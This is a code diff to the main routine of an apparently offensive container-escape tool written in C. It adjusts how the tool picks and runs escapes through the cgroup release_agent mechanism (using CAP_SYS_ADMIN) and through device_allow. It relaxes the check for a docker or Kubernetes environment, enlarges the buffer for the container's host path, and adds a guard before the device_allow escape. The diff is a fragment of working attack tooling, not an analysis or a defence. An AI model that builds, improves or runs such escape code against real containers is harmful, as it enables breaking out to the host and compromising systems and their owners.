@@ -187,18 +187,16 @@ int main(int argc, char *argv[]) {
     memset(cgroup_id, 0x00, 512);
     get_cgroup_id(cgroup_id);
     if (!*cgroup_id) {
-        printf_wrapper(ERROR, "The current running environment does not appear to be a docker or k8s\n");
-        exit(EXIT_SUCCESS);
+        printf_wrapper(WARNING, "The current running environment does not appear to be a docker or k8s\n");
     }
-
     switch (attack_info.attack_type) {
         case RELEASE_AGENT: {
             if (cap_sys_admin_check() == -1) {
                 printf_wrapper(ERROR,
                                "Current process don't have CAP_SYS_ADMIN capability，can't escape by using release_agent\n");
             }
-            release_agent_attack_info.container_path_in_host = (char *) malloc(512 * sizeof(char));
-            memset(release_agent_attack_info.container_path_in_host, 0x00, 512);
+            release_agent_attack_info.container_path_in_host = (char *) malloc(1024 * sizeof(char));
+            memset(release_agent_attack_info.container_path_in_host, 0x00, 1024);
             if (attack_info.container_path[0] == 0x00) {
                 printf_wrapper(INFO, "Try to get container path in host\n");
                 char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
@@ -260,6 +258,10 @@ int main(int argc, char *argv[]) {
             break;
         }
         case DEVICE_ALLOW: {
+            if (!*cgroup_id) {
+                printf_wrapper(ERROR, "Get container cgroup path failed, cannot escape by device_allow\n");
+                exit(EXIT_SUCCESS);
+            }
             if (attack_info.attack_mode == EXEC) {
                 printf_wrapper(ERROR, "Escape by device_allow not support exec mode\n");
                 exit(EXIT_SUCCESS);
